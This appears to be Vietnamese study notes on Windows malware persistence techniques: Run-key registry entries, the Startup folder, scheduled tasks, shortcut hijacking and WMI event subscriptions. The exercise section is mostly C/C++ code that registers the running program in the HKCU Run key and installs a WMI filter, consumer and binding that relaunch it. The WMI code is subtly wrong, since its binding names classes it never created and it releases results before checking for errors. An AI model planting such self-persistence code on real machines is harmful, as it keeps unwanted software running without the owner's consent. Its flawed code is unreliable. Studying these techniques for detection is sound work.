# Lý thuyết

## Modifying registry keys

- Mã độc sẽ tự thêm mình vào key run của máy tính để mỗi khi máy tính được khởi động, mã độc sẽ được chạy.

- Các key được dùng:

  - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

  - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

  - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

  - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 
## Special folders

- Mã độc sẽ tự thêm bản thân vào các folder đặc biệt để nó có thể tự chạy mỗi khi máy tính được khởi động:

- Thư mục được dùng: C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

## Task scheduler

- Mã độc sẽ tự tạo 1 task để chạy mỗi khi máy tính khởi động hoặc để chạy trong một thời điểm nào đó.

- Một task có 3 thành phần:

  - Trigger (Kích hoạt): Đây là sự kiện hoặc điều kiện nào đó mà khi xảy ra sẽ kích hoạt công việc.
 
  - Action (Hành động): Đây là công việc cụ thể sẽ được thực hiện khi Trigger được kích hoạt.
 
  - Conditions (Điều kiện): Điều kiện được sử dụng để kiểm soát khi nào công việc được thực hiện dựa trên các điều kiện hệ thống cụ thể.
 
- Ví dụ:

  - Chạy mỗi khi khởi động lại máy:
 
    ```
    #include <windows.h>
    
    int main()
    {
        system("schtasks /create /sc onstart /tn MyNotepadTask /tr \"C:\\Windows\\System32\\notepad.exe\"");
        return 0;
    }
    ``` 

  - Chạy mỗi khi 5h chiều:
 
    ```
    #include <windows.h>
  
    int main()
    {
        system("schtasks /create /sc daily /st 17:00 /tn MyNotepadTask /tr \"C:\\Windows\\System32\\notepad.exe\"");
        return 0;
    }
    ```
## Shortcut hijacking

- Mã độc sẽ tạo ra các shortcut hoặc sửa các shortcut đã có trên máy tính để khi người dùng nhấp vào shortcut giả mạo đó, mã độc sẽ được mở lên.

## WMI event subscription

- WMI (Windows Management Instrumentation) Event Subscription là một kỹ thuật mà malware thường sử dụng để duy trì persistence (khả năng tồn tại và tự khởi động lại sau khi hệ thống được khởi động lại) trên máy tính bị nhiễm.

- Có 3 bước chính:

  - Event Filter: thiết lập một event filter để theo dõi một sự kiện cụ thể, có thể là sự kiện khởi động lại hoặc quá trình đăng nhập của người dùng.
 
  - Event Consumer: thiết lập một event consumer để cho biết điều gì sẽ xảy ra khi sự kiện ở event filter xảy ra.
 
  - Filter to Consumer Binding: cuối cùng mã độc sẽ liên kết event filter và event consumer.

# Bài tập

## Modifying registry keys 

```
#include <windows.h>

int main() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    const char* czStartName = "Hehe";
    const char* czExePath = path;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, czStartName, 0, REG_SZ, (LPBYTE)czExePath, strlen(czExePath) + 1);
        RegCloseKey(hKey);
    }

    return 0;
}
```

## WMI event subscription

```
#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>

#pragma comment(lib, "wbemuuid.lib")

int main()
{
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres))
    {
        return 1;              
    }
    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
        NULL,                        // Authentication info 
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
    );

    if (FAILED(hres))
    {
        CoUninitialize();
        return 1;          
    }
    IWbemLocator* pLoc = NULL;

    hres = CoCreateInstance(
        CLSID_WbemAdministrativeLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);

    if (FAILED(hres))
    {
        CoUninitialize();
        return 1;       
    }
    IWbemServices* pSvc = NULL;

    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\Subscription"), // Object path of WMI namespace
        NULL,                    // User name. NULL = current user
        NULL,                    // User password. NULL = current
        0,                       // Locale. NULL accepts the current
        NULL,                    // Security flags.
        0,                       // Authority (for example, Kerberos)
        0,                       // Context object 
        &pSvc                    // pointer IWbemServices proxy
    );

    if (FAILED(hres))
    {
        pLoc->Release();
        CoUninitialize();
        return 1;                
    }
    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
        NULL,                        // Server principal name 
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // client identity
        EOAC_NONE                    // proxy capabilities 
    );

    if (FAILED(hres))
    {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;              
    }
    IWbemClassObject* pFilter = nullptr;
    hres = pSvc->GetObject(_bstr_t("__EventFilter"), 0, nullptr, &pFilter, nullptr);
    if (FAILED(hres))
    {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1; 
    }
    _variant_t varFilterName = "MyFilter";
    _variant_t varQuery = "SELECT * FROM Win32_ComputerSystemEvent WHERE EventType = 2";
    _variant_t varQueryLang = "WQL";
    pFilter->Put(L"Name", 0, &varFilterName, 0);
    pFilter->Put(L"Query", 0, &varQuery, 0);
    pFilter->Put(L"QueryLanguage", 0, &varQueryLang, 0);
    IWbemCallResult* pResult = nullptr;
    hres = pSvc->PutInstance(pFilter, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, &pResult);
    pResult->Release();
    if (FAILED(hres))
    {
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }
    IWbemClassObject* pConsumer = nullptr;
    hres = pSvc->GetObject(_bstr_t("CommandLineEventConsumer"), 0, nullptr, &pConsumer, nullptr);
    if (FAILED(hres))
    {
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }
    _variant_t varConsumerName = "MyConsumer";
    _variant_t varCommandLineTemplate = path;
    pConsumer->Put(L"Name", 0, &varConsumerName, 0);
    pConsumer->Put(L"CommandLineTemplate", 0, &varCommandLineTemplate, 0);
    hres = pSvc->PutInstance(pConsumer, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, &pResult);
    pResult->Release();
    if (FAILED(hres))
    {
        pConsumer->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1; 
    }
    IWbemClassObject* pBinding = nullptr;
    hres = pSvc->GetObject(_bstr_t("__FilterToConsumerBinding"), 0, nullptr, &pBinding, nullptr);
    if (FAILED(hres))
    {
        pConsumer->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1; 
    }
    _variant_t varFilterBinding = "WMIEventFilter.Name=\"MyFilter\"";
    _variant_t varConsumerBinding = "WMIEventConsumer.Name=\"MyConsumer\"";
    pBinding->Put(L"Filter", 0, &varFilterBinding, 0);
    pBinding->Put(L"Consumer", 0, &varConsumerBinding, 0);
    hres = pSvc->PutInstance(pBinding, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, &pResult);
    pResult->Release();
    if (FAILED(hres))
    {
        pBinding->Release();
        pConsumer->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1; 
    }
    pBinding->Release();
    pConsumer->Release();
    pFilter->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return 0;
}
```
